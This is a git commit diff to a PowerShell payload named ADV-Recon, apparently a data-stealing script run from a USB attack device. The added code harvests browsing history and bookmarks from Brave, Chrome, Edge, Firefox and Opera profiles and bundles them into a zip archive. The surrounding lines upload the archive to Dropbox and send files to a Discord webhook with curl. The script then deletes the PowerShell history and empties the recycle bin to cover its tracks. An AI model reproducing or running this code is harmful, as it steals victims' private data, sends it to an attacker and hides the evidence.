2524f4c10cfd399cb0d5e3baa1b3fe34fe67c50c
Neser <62424931+bera-neser@users.noreply.github.com>
2025-01-28 19:54:09 +0300

    Update ADV-Recon.ps1

--- Payloads/Flip-ADV-Recon/ADV-Recon.ps1
+++ Payloads/Flip-ADV-Recon/ADV-Recon.ps1
@@ -462,26 +462,23 @@ $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
 
-function Get-BrowserData {
+$regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
+function Get-BrowserData {
     [CmdletBinding()]
+    
     param (	
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$Browser,    
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$DataType 
+    	[Parameter (Position=1,Mandatory = $True)]
+    	[string]$Path,
+    	[Parameter (Position=1,Mandatory = $True)]
+    	[string]$Browser,
+    	[Parameter (Position=1,Mandatory = $True)]
+    	[string]$DataType,
+    	[Parameter (Position=1,Mandatory = $False)]
+    	[string]$Profile
     ) 
 
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    
-
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
     $Value | ForEach-Object {
         $Key = $_
         if ($Key -match $Search){
@@ -495,15 +492,47 @@ function Get-BrowserData {
     } 
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+$browsers = @('brave', 'chrome', 'edge', 'firefox', 'opera')
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+foreach ($browser in $browsers) {
+    if ($browser -eq 'brave') {
+	$Brave_Profiles = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" -Directory | Where-Object { $_.Name -like "Profile*" } | Select-Object -ExpandProperty Name
+	
+	if ($Brave_Profiles) {
+	    $Brave_Profiles | ForEach-Object {
+	        $profile = $_
+	 	$path_history = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" + $profile + "\History"
+   		$path_bookmarks = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" + $Profile + "\Bookmarks"
+	        Get-BrowserData -Browser $browser -DataType "history" -Profile $profile -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
+	        Get-BrowserData -Browser $browser -DataType "bookmarks" -Profile $profile -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+	    }
+	} else {
+ 	    $path_history = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
+	    $path_bookmarks = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
+	    Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
+	    Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+	}
+    } elseif ($browser -eq 'chrome') {
+    	$path_history = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+	$path_bookmarks = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
+	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+    } elseif ($browser -eq 'edge') {
+    	$path_history = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+	$path_bookmarks = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
+	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+    } elseif ($browser -eq 'firefox') {
+    	$path_history = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
+    } elseif ($browser -eq 'opera') {
+        $Opera = Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Opera Software\" | Where-Object { $_.Name -like "Opera*" } | Select-Object -ExpandProperty Name
+	$path_history = "$env:USERPROFILE\AppData\Roaming\Opera Software\" + $Opera + "\Default\History"
+	$path_bookmarks = "$env:USERPROFILE\AppData\Roaming\Opera Software\" + $Opera + "\Default\Bookmarks"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
+	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+    }
+}
 
 ############################################################################################################################################################
 
@@ -528,20 +557,20 @@ Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 # Upload output file to dropbox
 
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$db = get_access_token
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+function Upload-to-DropBox {
+    $TargetFilePath="/$ZIP"
+    $SourceFilePath="$env:TEMP\$ZIP"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $db = get_access_token
+    $authorization = "Bearer " + $db
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-dropbox
+Upload-to-DropBox
 
 ############################################################################################################################################################
 
@@ -570,8 +599,6 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
- 
-
 ############################################################################################################################################################
 
 <#
@@ -594,7 +621,6 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
 		
 ############################################################################################################################################################
 
